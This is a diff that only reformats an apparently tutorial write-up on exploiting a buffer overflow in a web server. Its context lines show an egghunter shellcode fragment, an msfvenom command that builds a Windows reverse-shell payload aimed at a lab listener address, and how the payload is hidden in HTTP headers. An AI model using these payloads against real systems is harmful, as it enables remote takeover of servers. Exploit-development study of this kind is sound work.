@@ -137,6 +137,7 @@ After a bit of playing with various lengths we can conclude that EIP is overwrit
 
 
 * Proof of concept code
+
 ```
 #!/usr/bin/python
 
@@ -246,6 +247,7 @@ As next step, we need to find address with ```JMP ESP``` and write opcodes to ju
 Since this is a web server we can try our luck with usual bad characters without looking for a bad ones:
 
 * Generate egghunter (for w00t egg):
+
 ```
 /usr/bin/msf-egghunter -f python -e w00t -p windows -a x86
 buf =  b""
@@ -254,7 +256,8 @@ buf += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
 buf += b"\xea\xaf\x75\xe7\xff\xe7"
 ```
 
-* Generate reverse shell code
+* Generate reverse shell code:
+
 ```
 msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=172.16.24.204 LPORT=4444 -f python -b "\x00\x0a\0d"
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -304,7 +307,8 @@ Since there are several choices we can use: 77C11F13.
 
 After a lots of "try and fail" attempts a place for shell code was finally found. If we place egghunter in Host header and egg+shellcode in Agent header, shellcode will end up in a memory and egghunter will eventually find it.
 
-* Final exploit code is following
+* Final exploit code is following:
+
 ```
 #!/usr/bin/python
 import socket
